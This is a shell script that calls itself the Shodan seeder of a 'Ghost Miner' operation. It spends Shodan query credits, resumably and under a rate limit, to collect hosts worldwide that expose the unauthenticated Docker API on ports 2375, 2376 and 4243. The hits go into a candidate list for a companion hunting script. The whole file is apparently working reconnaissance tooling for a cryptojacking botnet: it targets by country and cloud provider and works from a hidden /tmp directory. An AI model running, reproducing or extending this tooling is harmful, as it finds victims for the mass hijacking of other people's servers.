#!/bin/sh
# ============================================================================
# Ghost Miner Shodan seeder - turn query credits into docker candidates.
#
# Measured the moment the Membership plan went live: `port:2375 country:DE`
# reports 4140 hosts and hands back 100 per request (1 query credit each). The
# free OSS key 403s on that endpoint, which is why the wide sweep was ever the
# only arm of this vector.
#
# 100 query credits/month is the entire budget, so this is deliberately
# resumable and self-limiting: every query that has been run is recorded in
# $WORK/seed.done, so a re-run continues exactly where it stopped and a credit is
# never spent twice. `due` lets hunt.sh ask whether it is time, so an hourly hunt
# cannot burn the month in a day.
#
# usage: seed.sh [stat|due|run [max]]
# env:   SEED_MAX (queries per run), SEED_PAGES (pages per query), SEED_EVERY (s)
# ============================================================================
set -u

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
# snapshot env overrides BEFORE sourcing worker.env, or the published file always
# wins and "SEED_MAX=45 sh seed.sh" silently runs with the seeded default instead.
E_MAX="${SEED_MAX:-}"; E_PAGES="${SEED_PAGES:-}"; E_EVERY="${SEED_EVERY:-}"; E_KEY="${SHODAN_KEY:-}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
[ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK"
KEY="${E_KEY:-${SHODAN_KEY:-}}"
MAX="${E_MAX:-${SEED_MAX:-10}}"
PAGES="${E_PAGES:-${SEED_PAGES:-1}}"
EVERY="${E_EVERY:-${SEED_EVERY:-259200}}"
SEENQ="$WORK/seed.done"
STAMP="$WORK/seed.stamp"
touch "$SEENQ"

# Highest-yield first, so a partial run (or a small SEED_MAX) still gets the
# docker-dense countries before the long tail. One query = one credit = up to
# 100 hosts. Never repeat a query: the population it covers does not change
# fast enough to be worth a second credit.
QUERIES="\
port:2375 country:DE
port:2375 country:US
port:2375 country:FR
port:2375 country:NL
port:2375 country:GB
port:2375 country:PL
port:2375 country:FI
port:2375 country:CA
port:2375 country:SE
port:2375 country:SG
port:2375 country:JP
port:2375 country:AU
port:2375 country:IN
port:2375 country:BR
port:2375 country:ES
port:2375 country:IT
port:2375 country:CH
port:2375 country:AT
port:2375 country:RO
port:2375 country:CZ
port:2375 country:IE
port:2375 country:BE
port:2375 country:NO
port:2375 country:DK
port:2375 country:KR
port:2375 country:ZA
port:2375 country:TR
port:2375 country:PT
port:2375 country:MX
port:2375 country:ID
port:2375 org:Hetzner
port:2375 org:OVH
port:2375 org:DigitalOcean
port:2375 org:Contabo
port:2375 org:Vultr
port:2375 org:Linode
port:2375 org:Scaleway
port:2375 org:Alibaba
port:2376
port:4243
port:2375 country:DE page2
port:2375 country:US page2"

stat_now() { date +%s; }

case "${1:-run}" in
    stat)
        echo "seed: queries run $(wc -l < "$SEENQ")  candidates in mass.found $(wc -l < "$WORK/mass.found" 2>/dev/null || echo 0)"
        echo "seed: key $([ -n "$KEY" ] && echo present || echo absent)  max/run $MAX  every ${EVERY}s"
        [ -s "$STAMP" ] && echo "seed: last run $(( $(stat_now) - $(cat "$STAMP") ))s ago"
        exit 0 ;;
    due)
        [ -n "$KEY" ] || exit 1
        [ -s "$STAMP" ] || exit 0
        [ $(( $(stat_now) - $(cat "$STAMP") )) -ge "$EVERY" ] && exit 0
        exit 1 ;;
    run)
        shift 2>/dev/null || :
        [ -n "${1:-}" ] && MAX="$1"
        [ -n "$KEY" ] || { echo "seed: SHODAN_KEY unset"; exit 0; }
        [ -x "$SELF_DIR/shodan.sh" ] || [ -r "$SELF_DIR/shodan.sh" ] || { echo "seed: no shodan.sh"; exit 1; }
        n=0; spent=0
        # the query strings contain spaces, so split the list on NEWLINES (a
        # plain `for q in $QUERIES` word-splits and silently turns
        # "port:2375 country:DE" into "port:2375", i.e. burns a credit per query
        # for a far worse filter).
        IFS_OLD="$IFS"
        IFS='
'
        for q in $QUERIES; do
            [ "$n" -ge "$MAX" ] && { echo "seed: max $MAX reached"; break; }
            grep -qxF "$q" "$SEENQ" 2>/dev/null && continue
            qq="$q"; pg=1
            # " pageN" is our paging marker, not part of the query Shodan sees
            case "$q" in *" page"[0-9]*) qq=$(printf '%s' "$q" | sed 's/ page[0-9]*$//'); pg=$(printf '%s' "$q" | sed 's/.* page//') ;; esac
            SHODAN_PAGES="$pg" sh "$SELF_DIR/shodan.sh" search "$qq" || :
            printf '%s\n' "$q" >> "$SEENQ"
            n=$((n + 1)); spent=$((spent + pg))
            sleep 1
        done
        IFS="$IFS_OLD"
        stat_now > "$STAMP"
        echo "seed: ran $n quer$([ "$n" = 1 ] && echo y || echo ies) (~$spent credit(s)), candidates $(wc -l < "$WORK/mass.found" 2>/dev/null || echo 0)" ;;

    *) echo "usage: $0 [stat|due|run [max]]"; exit 2 ;;
esac
